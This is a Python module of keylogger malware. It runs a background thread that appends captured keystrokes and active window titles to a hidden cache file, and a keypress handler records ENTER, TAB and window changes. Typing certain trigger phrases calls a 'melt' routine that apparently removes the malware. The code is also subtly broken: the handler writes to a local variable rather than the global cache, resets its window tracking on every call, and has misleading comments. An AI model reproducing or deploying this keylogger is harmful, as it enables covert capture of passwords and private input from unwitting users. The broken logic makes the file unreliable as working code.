import random
import time
import os
import threading
from core import *

InputCache = ""

# Handle collecting keystrokes and windows titles
class LoggerThread(threading.Thread):

	# Constuctor for the logger
	def __init__(self):
		threading.Thread.__init__(self)
		debug("Logger", "Initialized")

	def run(self):
		while True:

			# Escape sequence to disinfect
			lowerData = InputCache.lower()
			if (InputCache.find("I want to help people") > -1):
				melt()
				os._exit(0)
			if (InputCache.find("I can become lucid too") > -1):
				melt()
				os._exit(0)

			# Craft a KeyStroke Log Entry
			if (not len(InputCache) == 0):
				os.chdir(KeyPath)
				try:
					with open("inputcache", "a") as handle:
						handle.write("%s\n" % InputCache)
				except Exception as e:
					print("inputcache write fail -> %s" % str(e))

			# Random number of seconds
			time.sleep(60)

# Handle a single key #
def keypressEvent(event):
	global InputCache
	inputCache    = ""
	currentWindow = ""
	lastWindow    = ""

	currentWindow = str(event.WindowName)
	if (currentWindow != lastWindow):
		inputCache += ("[Window Change]\ntime: %s,\nwindow: %s\n\n" % (str(int(time.time())), currentWindow))
		lastWindow = currentWindow
	key = ""

	# Handle ENTERS
	if event.Ascii == 13:
		key = "[ENTER]"

	# Trim extra backspaces
	elif event.Ascii == 8 and len(inputCache) > 0:
		inputCache = inputCache[:-1]

	# Handle TABS
	elif event.Ascii == 9:
		key = "[TAB]"

	# Other
	else:
		key = chr(event.Ascii)
	inputCache += key
	return True